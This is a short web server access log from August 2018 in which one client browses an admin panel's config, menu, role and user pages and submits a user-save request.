123.125.250.164 - - [31/Aug/2018:02:27:36 +0000] "GET /sys/config/list?_search=false&nd=1535682456731&limit=10&page=1&sidx=&order=asc&_=1535682456686 HTTP/1.1" 200 85 "http://47.92.143.230/sys/config.html" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "-"
123.125.250.164 - - [31/Aug/2018:02:27:38 +0000] "GET /sys/menu.html HTTP/1.1" 200 4366 "http://47.92.143.230/index.html" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "-"
123.125.250.164 - - [31/Aug/2018:02:27:38 +0000] "GET /js/sys/menu.js?_1535682458436 HTTP/1.1" 200 4467 "http://47.92.143.230/sys/menu.html" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "-"
123.125.250.164 - - [31/Aug/2018:02:27:38 +0000] "GET /sys/menu/list?_search=false&nd=1535682458479&limit=10&page=1&sidx=&order=asc&_=1535682458444 HTTP/1.1" 200 1828 "http://47.92.143.230/sys/menu.html" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "-"
123.125.250.164 - - [31/Aug/2018:02:27:41 +0000] "GET /sys/role.html HTTP/1.1" 200 2905 "http://47.92.143.230/index.html" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "-"
123.125.250.164 - - [31/Aug/2018:02:27:41 +0000] "GET /js/sys/role.js?_1535682461620 HTTP/1.1" 200 3886 "http://47.92.143.230/sys/role.html" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "-"
123.125.250.164 - - [31/Aug/2018:02:27:41 +0000] "GET /sys/role/list?_search=false&nd=1535682461655&limit=10&page=1&sidx=&order=asc&_=1535682461624 HTTP/1.1" 200 85 "http://47.92.143.230/sys/role.html" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "-"
123.125.250.164 - - [31/Aug/2018:02:27:44 +0000] "GET /sys/user.html HTTP/1.1" 200 3834 "http://47.92.143.230/index.html" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "-"
123.125.250.164 - - [31/Aug/2018:02:27:44 +0000] "GET /js/sys/user.js?_1535682464313 HTTP/1.1" 200 3406 "http://47.92.143.230/sys/user.html" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "-"
123.125.250.164 - - [31/Aug/2018:02:27:44 +0000] "GET /sys/user/list?_search=false&nd=1535682464370&limit=10&page=1&sidx=&order=asc&_=1535682464323 HTTP/1.1" 200 400 "http://47.92.143.230/sys/user.html" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "-"
123.125.250.164 - - [31/Aug/2018:02:27:51 +0000] "GET /sys/role/select?_=1535682464324 HTTP/1.1" 200 20 "http://47.92.143.230/sys/user.html" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "-"
123.125.250.164 - - [31/Aug/2018:02:28:04 +0000] "POST /sys/user/save HTTP/1.1" 200 39 "http://47.92.143.230/sys/user.html" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "-"
